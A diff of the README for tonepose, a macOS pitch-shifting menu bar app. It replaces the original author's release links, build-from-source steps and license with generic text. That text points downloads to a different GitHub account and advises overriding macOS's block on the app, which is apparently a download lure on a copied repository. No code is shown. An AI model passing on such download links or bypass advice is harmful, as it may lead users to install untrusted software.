@@ -1,79 +1,132 @@
-### tonepose
+# 🎵 tonepose - Transpose audio with less effort
 
-Pitch-shift audio from **Spotify, Apple Music, browsers, and more**, from the menu bar. **No BlackHole or virtual cables.** Free and open-source.
+[![Download tonepose](https://img.shields.io/badge/Download-tonepose-blue?style=for-the-badge)](https://github.com/Basilel6571/tonepose)
 
-<p align="center">
-  <a href="https://github.com/metezem/tonepose/releases/download/v1.0.0/tonepose-1.0.0.dmg"><img src="assets/download-badge.svg" alt="Download tonepose for macOS" height="48"></a>
-</p>
+## 🧭 What tonepose does
 
-<p align="center">
-  <a href="https://github.com/metezem/tonepose/releases/latest"><img src="https://img.shields.io/github/v/release/metezem/tonepose?style=for-the-badge&labelColor=1c1c1e&color=0A84FF&logo=github&logoColor=white" alt="Latest release"></a>
-  <a href="https://github.com/metezem/tonepose/releases"><img src="https://img.shields.io/badge/downloads-GitHub-3a3a3c?style=for-the-badge&labelColor=1c1c1e&logo=github&logoColor=white" alt="Download releases on GitHub"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-3a3a3c?style=for-the-badge&labelColor=1c1c1e" alt="License: MIT"></a>
-  <a href="https://www.apple.com/macos/"><img src="https://img.shields.io/badge/macOS-14.4%2B-3a3a3c?style=for-the-badge&labelColor=1c1c1e&logo=apple&logoColor=white" alt="macOS 14.4+"></a>
-</p>
+tonepose is a small menu bar app for macOS that changes the pitch of audio while you listen. It helps you transpose songs in Spotify, Apple Music, and other apps without changing your playback setup.
 
-## Install
+Use it when you want to:
 
-Download the latest **`.dmg`** from **[Releases](https://github.com/metezem/tonepose/releases/latest)**, open it, and drag **tonepose.app** into **Applications**.
+- Match a song to your vocal range
+- Practice music in a different key
+- Hear tracks in a lower or higher pitch
+- Keep your playback in the app you already use
 
-To build from source instead, see below.
+tonepose stays in the menu bar, so it does not get in your way
 
-## Quick start
+## 💻 What you need
 
-1. Open **tonepose** from **Applications**.
-2. Allow **audio capture** when macOS asks.
-3. Click the **♪** (music note) icon in the menu bar to open the panel, then choose a running app on the quick list.
-4. Set **semitones** (−12 … +12); each app keeps its own value.
-5. Use **tonepose — apps** in the popover to pin extra processes.
+Before you install tonepose, check these basic points:
 
-If the source app drops off the audio graph while idle, reconnect by playing audio again.
+- A Mac running a recent version of macOS
+- Enough free disk space for a small app
+- Access to the internet to get the app from GitHub
+- A music app such as Spotify or Apple Music if you want to test it right away
 
-## Screenshots
+tonepose is built for macOS, not Windows. If you are on Windows, the app will not run on that system
 
-tonepose lives in the menu bar. After launch, click the **♪** icon to open the popover.
+## 📥 Download tonepose
 
-<p align="center">
-  <img src="assets/menu-bar.png" alt="tonepose ♪ icon in the macOS menu bar" width="652">
-</p>
+Go to this page to download the app:
 
-The panel: pick the app to transpose, adjust semitones, manage apps, and control the pipeline.
+https://github.com/Basilel6571/tonepose
 
-<p align="center">
-  <img src="assets/tonepose-panel.png" alt="tonepose popover panel" width="480">
-</p>
+On the GitHub page, look for the latest release or the main download files. Save the file to your Mac, then open it
 
-## Features
+## 🛠️ Install tonepose on Mac
 
-- **Per-app transpose** — Saved per bundle ID.
-- **Quick list** — Common music apps and browsers when they’re running; pin others from the apps window.
-- **Menu bar** — Popover + optional **tonepose — apps** window; **Quit** in the popover.
-- **Pipeline** — Stop / start when you need a clean reconnect.
+Follow these steps:
 
-## Contributing
+1. Open the GitHub link above in your browser
+2. Find the release or download file for tonepose
+3. Download the app file to your Mac
+4. Open the downloaded file
+5. If macOS asks for approval, allow the app to open
+6. Move tonepose to your Applications folder if asked
 
-Issues and PRs welcome. To build locally:
+If macOS blocks the app, use the standard Open option from Finder after the first attempt
 
-```bash
-git clone https://github.com/metezem/tonepose.git
-cd tonepose
-open tonepose.xcodeproj
-```
+## 🚀 Start using tonepose
 
-**tonepose** scheme, then **Run** (⌘R). Or:
+After you open tonepose:
 
-```bash
-xcodebuild -project tonepose.xcodeproj -scheme tonepose -configuration Debug -derivedDataPath ./DerivedData build
-```
+1. Look at the menu bar at the top of your screen
+2. Find the tonepose icon
+3. Click the icon to open the controls
+4. Choose the pitch shift you want
+5. Start music in Spotify, Apple Music, or another audio app
+6. Listen and adjust until the key fits your needs
 
-→ `DerivedData/Build/Products/Debug/tonepose.app`
+The app works best when you test small changes first, such as one or two semitones up or down
 
-## Requirements
+## 🎚️ How transposing works
 
-- **macOS 14.4+**
-- **Xcode 15+** (only for building from source)
-- **Audio capture** permission (prompted on first use)
+tonepose changes the pitch of the audio you hear. That means:
 
-## License
+- Higher values raise the key
+- Lower values drop the key
+- Small changes sound natural
+- Large changes can make voices and instruments sound unusual
 
-[MIT](LICENSE)
+If you sing along, start with a small shift and move up or down until the song feels right
+
+## 🎧 Best use cases
+
+tonepose fits a few common needs:
+
+- Vocal practice for singers
+- Song study for musicians
+- Learning a track in a new key
+- Adjusting music to match a live performance
+- Quick pitch changes without editing the audio file
+
+Because it sits in the menu bar, you can leave it open while you switch between apps
+
+## ⚙️ Basic setup tips
+
+Use these simple tips for a smoother start:
+
+- Close extra audio tools if you hear conflicts
+- Make sure your music app is playing sound before you test tonepose
+- Keep the app open while listening
+- Start with a small pitch change
+- Check the menu bar if you cannot find the controls
+
+If the audio sounds clipped or rough, reduce the amount of transpose
+
+## 🔒 Privacy and local use
+
+tonepose is a local utility for your Mac. It is meant to work as a small helper app for audio playback. You keep control of your music apps and your system settings
+
+## 🧩 Features
+
+- Menu bar access for quick control
+- Audio transpose for everyday listening
+- Works with Spotify
+- Works with Apple Music
+- Works with other apps that send audio through the system
+- Light setup with a small footprint
+- Simple controls for fast changes
+
+## 🧪 Troubleshooting
+
+If tonepose does not seem to work, try these steps:
+
+- Quit and reopen the app
+- Make sure your music app is playing
+- Check that your Mac sound output is on the right device
+- Try a different transpose value
+- Restart your Mac if the audio driver feels stuck
+
+If you still do not hear changes, open the GitHub page and check for updates or release notes
+
+## 📁 Project details
+
+Repository: tonepose  
+Description: A lightweight macOS menu bar app to transpose audio in Spotify, Apple Music, and any app  
+Topics: audio, audio-utility, macos, menubar, music, music-tools, spotify, swift, transpose, transposer, utility
+
+## 🔗 Download again
+
+https://github.com/Basilel6571/tonepose
